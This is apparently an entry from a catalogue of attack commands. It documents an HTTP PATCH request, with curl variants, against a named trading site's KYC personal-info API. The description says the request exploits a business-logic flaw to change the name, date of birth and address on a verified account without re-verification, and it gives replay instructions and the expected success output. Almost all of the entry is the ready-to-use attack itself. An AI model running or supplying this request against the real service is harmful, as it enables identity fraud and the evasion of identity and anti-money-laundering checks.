---
id: cmd-patch-personal-001
data: >-
  PATCH /kyc_back/api/v2/surveys/personal_info HTTP/1.1

  Host: my.exness.com

  Content-Type: application/json


  {"first_name":"test-1","last_name":"test-2","test-3":"","dob":"1990-01-01","address":"test-4"}
tags:
  - api-update
  - profile-modify
type: command
output: '{"status":"OK"}'
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:12.727Z'
verified: false
validated: true
submitted: true
---
# patch-exness-personal-info

## Command

```http
PATCH /kyc_back/api/v2/surveys/personal_info HTTP/1.1
Host: my.exness.com
Content-Type: application/json

{"first_name":"test-1","last_name":"test-2","test-3":"","dob":"1990-01-01","address":"test-4"}
```

## Description

This HTTP PATCH request updates personal information on a verified EXNESS account via an unauthenticated API endpoint, exploiting a business logic flaw to change name, date of birth, and address post-KYC without re-verification. Use in tools like Burp Repeater or curl for replay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Body (JSON) | Fields: first_name, last_name, test-3 (unused), dob (YYYY-MM-DD), address | Yes |
| Host | Target domain: my.exness.com | Yes |
| Content-Type | application/json | Yes |

## Examples

### Basic Usage

In curl (adapted for testing):
```bash
curl -X PATCH https://my.exness.com/kyc_back/api/v2/surveys/personal_info \
  -H "Content-Type: application/json" \
  -d '{"first_name":"test-1","last_name":"test-2","test-3":"","dob":"1990-01-01","address":"test-4"}'
```

### Advanced Usage

With authentication cookies from session:
```bash
curl -X PATCH https://my.exness.com/kyc_back/api/v2/surveys/personal_info \
  -H "Cookie: session=abc123" \
  -H "Content-Type: application/json" \
  -d '{"first_name":"John","last_name":"Doe","dob":"1980-05-15","address":"123 Fake St"}'
```

## Expected Output

HTTP 200 OK with JSON response: {"status":"OK"}, indicating successful profile update. Profile pages will reflect changes upon refresh.

## Related

- [[Related Procedure: Intercept-and-Modify-Post-Verification-Profile-Update]]
